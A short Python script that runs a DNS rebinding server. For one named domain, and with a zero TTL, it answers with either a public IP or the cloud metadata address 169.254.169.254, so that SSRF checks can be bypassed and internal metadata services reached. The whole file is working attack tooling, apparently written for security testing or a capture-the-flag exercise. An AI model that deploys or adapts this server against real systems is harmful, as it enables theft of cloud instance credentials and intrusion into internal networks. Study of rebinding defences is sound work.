from dnslib import DNSRecord, RR, A, QTYPE
from dnslib.server import DNSServer, BaseResolver
import random

REBIND_NAME = "rb.adithya-ms.co.in"
BENIGN_IP = "146.190.62.39"
INTERNAL_IP = "169.254.169.254"
TTL_SECONDS = 0

class RebindResolver(BaseResolver):
    def __init__(self):
        self.last_ip = None  # remember last answer for REBIND_NAME

    def resolve(self, request, handler):
        qname = str(request.q.qname).rstrip(".")
        qtype = QTYPE[request.q.qtype]
        print(f"[DNS] Query: {qname} ({qtype})")

        reply = request.reply()

        if qname == REBIND_NAME and qtype in ("A", "ANY"):
            # Selection rule:
            # - if last was INTERNAL -> must return BENIGN
            # - if last was BENIGN or None -> random between BENIGN and INTERNAL
            if self.last_ip == INTERNAL_IP:
                ip = BENIGN_IP
            else:
                ip = random.choice([BENIGN_IP, INTERNAL_IP])

            self.last_ip = ip

            reply.add_answer(RR(qname, QTYPE.A, rdata=A(ip), ttl=TTL_SECONDS))
            print(f"[DNS] REBIND {qname} -> {ip} (last_ip={self.last_ip})")
            return reply

        # For anything else under our zone, say NXDOMAIN
        if qname.endswith(REBIND_NAME):
            reply.header.rcode = 3  # NXDOMAIN
            return reply

        # Otherwise we are not authoritative
        reply.header.rcode = 3
        return reply

if __name__ == "__main__":
    ADDRESS = "0.0.0.0"
    PORT = 53
    resolver = RebindResolver()
    server = DNSServer(resolver, port=PORT, address=ADDRESS, tcp=False)
    print(f"[*] Rebinding DNS server starting on {ADDRESS}:{PORT} for {REBIND_NAME}")
    server.start()
